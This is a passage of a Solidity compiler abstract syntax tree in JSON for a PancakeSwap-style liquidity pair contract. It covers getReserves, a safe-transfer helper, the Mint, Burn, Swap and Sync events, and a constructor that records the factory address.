													"typeDescriptions": {
														"typeIdentifier": "t_uint112",
														"typeString": "uint112"
													}
												},
												"id": 1022,
												"nodeType": "ExpressionStatement",
												"src": "1504:20:6"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 1025,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 1023,
														"name": "_blockTimestampLast",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1013,
														"src": "1534:19:6",
														"typeDescriptions": {
															"typeIdentifier": "t_uint32",
															"typeString": "uint32"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"id": 1024,
														"name": "blockTimestampLast",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 978,
														"src": "1556:18:6",
														"typeDescriptions": {
															"typeIdentifier": "t_uint32",
															"typeString": "uint32"
														}
													},
													"src": "1534:40:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint32",
														"typeString": "uint32"
													}
												},
												"id": 1026,
												"nodeType": "ExpressionStatement",
												"src": "1534:40:6"
											}
										]
									},
									"documentation": null,
									"id": 1028,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "getReserves",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1007,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1300:2:6"
									},
									"returnParameters": {
										"id": 1014,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1009,
												"name": "_reserve0",
												"nodeType": "VariableDeclaration",
												"scope": 1028,
												"src": "1361:17:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint112",
													"typeString": "uint112"
												},
												"typeName": {
													"id": 1008,
													"name": "uint112",
													"nodeType": "ElementaryTypeName",
													"src": "1361:7:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint112",
														"typeString": "uint112"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1011,
												"name": "_reserve1",
												"nodeType": "VariableDeclaration",
												"scope": 1028,
												"src": "1392:17:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint112",
													"typeString": "uint112"
												},
												"typeName": {
													"id": 1010,
													"name": "uint112",
													"nodeType": "ElementaryTypeName",
													"src": "1392:7:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint112",
														"typeString": "uint112"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1013,
												"name": "_blockTimestampLast",
												"nodeType": "VariableDeclaration",
												"scope": 1028,
												"src": "1423:26:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint32",
													"typeString": "uint32"
												},
												"typeName": {
													"id": 1012,
													"name": "uint32",
													"nodeType": "ElementaryTypeName",
													"src": "1423:6:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint32",
														"typeString": "uint32"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1347:112:6"
									},
									"scope": 2193,
									"src": "1280:301:6",
									"stateMutability": "view",
									"superFunction": 785,
									"visibility": "public"
								},
								{
									"body": {
										"id": 1069,
										"nodeType": "Block",
										"src": "1657:268:6",
										"statements": [
											{
												"assignments": [
													1038,
													1040
												],
												"declarations": [
													{
														"constant": false,
														"id": 1038,
														"name": "success",
														"nodeType": "VariableDeclaration",
														"scope": 1069,
														"src": "1668:12:6",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"typeName": {
															"id": 1037,
															"name": "bool",
															"nodeType": "ElementaryTypeName",
															"src": "1668:4:6",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"value": null,
														"visibility": "internal"
													},
													{
														"constant": false,
														"id": 1040,
														"name": "data",
														"nodeType": "VariableDeclaration",
														"scope": 1069,
														"src": "1682:17:6",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_bytes_memory_ptr",
															"typeString": "bytes"
														},
														"typeName": {
															"id": 1039,
															"name": "bytes",
															"nodeType": "ElementaryTypeName",
															"src": "1682:5:6",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_storage_ptr",
																"typeString": "bytes"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1050,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"id": 1045,
																	"name": "SELECTOR",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 964,
																	"src": "1750:8:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bytes4",
																		"typeString": "bytes4"
																	}
																},
																{
																	"argumentTypes": null,
																	"id": 1046,
																	"name": "to",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1032,
																	"src": "1760:2:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																},
																{
																	"argumentTypes": null,
																	"id": 1047,
																	"name": "value",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1034,
																	"src": "1764:5:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_bytes4",
																		"typeString": "bytes4"
																	},
																	{
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	},
																	{
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																],
																"expression": {
																	"argumentTypes": null,
																	"id": 1043,
																	"name": "abi",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 2312,
																	"src": "1727:3:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_magic_abi",
																		"typeString": "abi"
																	}
																},
																"id": 1044,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"memberName": "encodeWithSelector",
																"nodeType": "MemberAccess",
																"referencedDeclaration": null,
																"src": "1727:22:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_abiencodewithselector_pure$_t_bytes4_$returns$_t_bytes_memory_ptr_$",
																	"typeString": "function (bytes4) pure returns (bytes memory)"
																}
															},
															"id": 1048,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "1727:43:6",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_memory_ptr",
																"typeString": "bytes memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bytes_memory_ptr",
																"typeString": "bytes memory"
															}
														],
														"expression": {
															"argumentTypes": null,
															"id": 1041,
															"name": "token",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1030,
															"src": "1703:5:6",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"id": 1042,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "call",
														"nodeType": "MemberAccess",
														"referencedDeclaration": null,
														"src": "1703:10:6",
														"typeDescriptions": {
															"typeIdentifier": "t_function_barecall_payable$_t_bytes_memory_ptr_$returns$_t_bool_$_t_bytes_memory_ptr_$",
															"typeString": "function (bytes memory) payable returns (bool,bytes memory)"
														}
													},
													"id": 1049,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "1703:77:6",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$_t_bool_$_t_bytes_memory_ptr_$",
														"typeString": "tuple(bool,bytes memory)"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "1667:113:6"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															"id": 1065,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 1052,
																"name": "success",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1038,
																"src": "1811:7:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "&&",
															"rightExpression": {
																"argumentTypes": null,
																"components": [
																	{
																		"argumentTypes": null,
																		"commonType": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		},
																		"id": 1063,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"leftExpression": {
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			},
																			"id": 1056,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"expression": {
																					"argumentTypes": null,
																					"id": 1053,
																					"name": "data",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 1040,
																					"src": "1823:4:6",
																					"typeDescriptions": {
																						"typeIdentifier": "t_bytes_memory_ptr",
																						"typeString": "bytes memory"
																					}
																				},
																				"id": 1054,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"memberName": "length",
																				"nodeType": "MemberAccess",
																				"referencedDeclaration": null,
																				"src": "1823:11:6",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "==",
																			"rightExpression": {
																				"argumentTypes": null,
																				"hexValue": "30",
																				"id": 1055,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "1838:1:6",
																				"subdenomination": null,
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_0_by_1",
																					"typeString": "int_const 0"
																				},
																				"value": "0"
																			},
																			"src": "1823:16:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		},
																		"nodeType": "BinaryOperation",
																		"operator": "||",
																		"rightExpression": {
																			"argumentTypes": null,
																			"arguments": [
																				{
																					"argumentTypes": null,
																					"id": 1059,
																					"name": "data",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 1040,
																					"src": "1854:4:6",
																					"typeDescriptions": {
																						"typeIdentifier": "t_bytes_memory_ptr",
																						"typeString": "bytes memory"
																					}
																				},
																				{
																					"argumentTypes": null,
																					"components": [
																						{
																							"argumentTypes": null,
																							"id": 1060,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": true,
																							"lValueRequested": false,
																							"nodeType": "ElementaryTypeNameExpression",
																							"src": "1861:4:6",
																							"typeDescriptions": {
																								"typeIdentifier": "t_type$_t_bool_$",
																								"typeString": "type(bool)"
																							},
																							"typeName": "bool"
																						}
																					],
																					"id": 1061,
																					"isConstant": false,
																					"isInlineArray": false,
																					"isLValue": false,
																					"isPure": true,
																					"lValueRequested": false,
																					"nodeType": "TupleExpression",
																					"src": "1860:6:6",
																					"typeDescriptions": {
																						"typeIdentifier": "t_type$_t_bool_$",
																						"typeString": "type(bool)"
																					}
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_bytes_memory_ptr",
																						"typeString": "bytes memory"
																					},
																					{
																						"typeIdentifier": "t_type$_t_bool_$",
																						"typeString": "type(bool)"
																					}
																				],
																				"expression": {
																					"argumentTypes": null,
																					"id": 1057,
																					"name": "abi",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 2312,
																					"src": "1843:3:6",
																					"typeDescriptions": {
																						"typeIdentifier": "t_magic_abi",
																						"typeString": "abi"
																					}
																				},
																				"id": 1058,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"lValueRequested": false,
																				"memberName": "decode",
																				"nodeType": "MemberAccess",
																				"referencedDeclaration": null,
																				"src": "1843:10:6",
																				"typeDescriptions": {
																					"typeIdentifier": "t_function_abidecode_pure$__$returns$__$",
																					"typeString": "function () pure"
																				}
																			},
																			"id": 1062,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"kind": "functionCall",
																			"lValueRequested": false,
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "1843:24:6",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		},
																		"src": "1823:44:6",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		}
																	}
																],
																"id": 1064,
																"isConstant": false,
																"isInlineArray": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"nodeType": "TupleExpression",
																"src": "1822:46:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"src": "1811:57:6",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "50616e63616b653a205452414e534645525f4641494c4544",
															"id": 1066,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "1882:26:6",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_4a184d07b37269afc05419c3e30fc72fcfc73d01055a62dee4e00c06fa61eb4a",
																"typeString": "literal_string \"Pancake: TRANSFER_FAILED\""
															},
															"value": "Pancake: TRANSFER_FAILED"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_4a184d07b37269afc05419c3e30fc72fcfc73d01055a62dee4e00c06fa61eb4a",
																"typeString": "literal_string \"Pancake: TRANSFER_FAILED\""
															}
														],
														"id": 1051,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															2328,
															2329
														],
														"referencedDeclaration": 2329,
														"src": "1790:7:6",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 1067,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "1790:128:6",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 1068,
												"nodeType": "ExpressionStatement",
												"src": "1790:128:6"
											}
										]
									},
									"documentation": null,
									"id": 1070,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "_safeTransfer",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1035,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1030,
												"name": "token",
												"nodeType": "VariableDeclaration",
												"scope": 1070,
												"src": "1610:13:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1029,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1610:7:6",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1032,
												"name": "to",
												"nodeType": "VariableDeclaration",
												"scope": 1070,
												"src": "1625:10:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1031,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1625:7:6",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1034,
												"name": "value",
												"nodeType": "VariableDeclaration",
												"scope": 1070,
												"src": "1637:10:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1033,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "1637:4:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1609:39:6"
									},
									"returnParameters": {
										"id": 1036,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1657:0:6"
									},
									"scope": 2193,
									"src": "1587:338:6",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "private"
								},
								{
									"anonymous": false,
									"documentation": null,
									"id": 1078,
									"name": "Mint",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 1077,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1072,
												"indexed": true,
												"name": "sender",
												"nodeType": "VariableDeclaration",
												"scope": 1078,
												"src": "1942:22:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1071,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1942:7:6",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1074,
												"indexed": false,
												"name": "amount0",
												"nodeType": "VariableDeclaration",
												"scope": 1078,
												"src": "1966:12:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1073,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "1966:4:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1076,
												"indexed": false,
												"name": "amount1",
												"nodeType": "VariableDeclaration",
												"scope": 1078,
												"src": "1980:12:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1075,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "1980:4:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1941:52:6"
									},
									"src": "1931:63:6"
								},
								{
									"anonymous": false,
									"documentation": null,
									"id": 1088,
									"name": "Burn",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 1087,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1080,
												"indexed": true,
												"name": "sender",
												"nodeType": "VariableDeclaration",
												"scope": 1088,
												"src": "2019:22:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1079,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2019:7:6",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1082,
												"indexed": false,
												"name": "amount0",
												"nodeType": "VariableDeclaration",
												"scope": 1088,
												"src": "2051:12:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1081,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "2051:4:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1084,
												"indexed": false,
												"name": "amount1",
												"nodeType": "VariableDeclaration",
												"scope": 1088,
												"src": "2073:12:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1083,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "2073:4:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1086,
												"indexed": true,
												"name": "to",
												"nodeType": "VariableDeclaration",
												"scope": 1088,
												"src": "2095:18:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1085,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2095:7:6",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2009:110:6"
									},
									"src": "1999:121:6"
								},
								{
									"anonymous": false,
									"documentation": null,
									"id": 1102,
									"name": "Swap",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 1101,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1090,
												"indexed": true,
												"name": "sender",
												"nodeType": "VariableDeclaration",
												"scope": 1102,
												"src": "2145:22:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1089,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2145:7:6",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1092,
												"indexed": false,
												"name": "amount0In",
												"nodeType": "VariableDeclaration",
												"scope": 1102,
												"src": "2177:14:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1091,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "2177:4:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1094,
												"indexed": false,
												"name": "amount1In",
												"nodeType": "VariableDeclaration",
												"scope": 1102,
												"src": "2201:14:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1093,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "2201:4:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1096,
												"indexed": false,
												"name": "amount0Out",
												"nodeType": "VariableDeclaration",
												"scope": 1102,
												"src": "2225:15:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1095,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "2225:4:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1098,
												"indexed": false,
												"name": "amount1Out",
												"nodeType": "VariableDeclaration",
												"scope": 1102,
												"src": "2250:15:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1097,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "2250:4:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1100,
												"indexed": true,
												"name": "to",
												"nodeType": "VariableDeclaration",
												"scope": 1102,
												"src": "2275:18:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1099,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2275:7:6",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2135:164:6"
									},
									"src": "2125:175:6"
								},
								{
									"anonymous": false,
									"documentation": null,
									"id": 1108,
									"name": "Sync",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 1107,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1104,
												"indexed": false,
												"name": "reserve0",
												"nodeType": "VariableDeclaration",
												"scope": 1108,
												"src": "2316:16:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint112",
													"typeString": "uint112"
												},
												"typeName": {
													"id": 1103,
													"name": "uint112",
													"nodeType": "ElementaryTypeName",
													"src": "2316:7:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint112",
														"typeString": "uint112"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1106,
												"indexed": false,
												"name": "reserve1",
												"nodeType": "VariableDeclaration",
												"scope": 1108,
												"src": "2334:16:6",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint112",
													"typeString": "uint112"
												},
												"typeName": {
													"id": 1105,
													"name": "uint112",
													"nodeType": "ElementaryTypeName",
													"src": "2334:7:6",
													"typeDescriptions": {
														"typeIdentifier": "t_uint112",
														"typeString": "uint112"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2315:36:6"
									},
									"src": "2305:47:6"
								},
								{
									"body": {
										"id": 1116,
										"nodeType": "Block",
										"src": "2379:37:6",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"id": 1114,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 1111,
														"name": "factory",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 966,
														"src": "2389:7:6",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 1112,
															"name": "msg",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 2325,
															"src": "2399:3:6",
															"typeDescriptions": {
																"typeIdentifier": "t_magic_message",
																"typeString": "msg"
															}
														},
														"id": 1113,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "sender",
														"nodeType": "MemberAccess",
														"referencedDeclaration": null,
														"src": "2399:10:6",
														"typeDescriptions": {
															"typeIdentifier": "t_address_payable",
															"typeString": "address payable"
														}
													},
													"src": "2389:20:6",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"id": 1115,
												"nodeType": "ExpressionStatement",
												"src": "2389:20:6"
											}
										]
									},
									"documentation": null,
									"id": 1117,
									"implemented": true,
									"kind": "constructor",
									"modifiers": [],
									"name": "",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 1109,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "2369:2:6"
									},
									"returnParameters": {
										"id": 1110,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "2379:0:6"
									},
									"scope": 2193,
									"src": "2358:58:6",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "public"
								},
								{
									"body": {
										"id": 1146,
										"nodeType": "Block",
										"src": "2585:167:6",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															"id": 1130,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"expression": {
																	"argumentTypes": null,
																	"id": 1127,
																	"name": "msg",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 2325,
																	"src": "2603:3:6",
																	"typeDescriptions": {
																		"typeIdentifier": "t_magic_message",
																		"typeString": "msg"
																	}
																},
																"id": 1128,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "sender",
																"nodeType": "MemberAccess",
																"referencedDeclaration": null,
																"src": "2603:10:6",
																"typeDescriptions": {
																	"typeIdentifier": "t_address_payable",
																	"typeString": "address payable"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "==",
															"rightExpression": {
																"argumentTypes": null,
																"id": 1129,
																"name": "factory",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 966,
																"src": "2617:7:6",
																"typeDescriptions": {
